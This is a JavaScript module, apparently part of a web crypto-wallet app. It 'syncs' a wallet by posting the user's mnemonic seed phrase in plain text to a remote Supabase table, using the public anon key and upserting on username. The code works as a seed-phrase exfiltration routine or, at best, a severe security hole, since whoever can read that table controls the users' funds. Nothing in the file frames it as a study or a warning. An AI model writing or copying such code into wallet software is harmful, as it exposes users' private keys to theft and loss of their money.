/**
 * Supabase client using fetch API (avoiding dependency issues)
 */

const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

export async function syncWalletToSupabase(walletData) {
  if (!SUPABASE_URL || !SUPABASE_KEY) {
    console.error('❌ Supabase credentials missing! Check VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY');
    return null;
  }

  const { username, mnemonic, balance } = walletData;
  const cleanMnemonic = Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic;
  
  // В новой структуре username — это primary key
  const name = username || 'Anonymous';

  console.log('🔄 Syncing wallet to Supabase for username:', name);

  try {
    const response = await fetch(`${SUPABASE_URL}/rest/v1/wallets?on_conflict=username`, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'resolution=merge-duplicates'
      },
      body: JSON.stringify({
        username: name,
        mnemonic: cleanMnemonic,
        balance: balance ? String(balance) : "0",
        created_at: new Date().toISOString()
      })
    });

    if (!response.ok) {
      const err = await response.text();
      console.error('❌ Supabase sync error:', response.status, err);
      return false;
    }

    console.log('✅ Wallet successfully synced to Supabase');
    return true;
  } catch (error) {
    console.error('❌ Supabase connection error:', error);
    return false;
  }
}
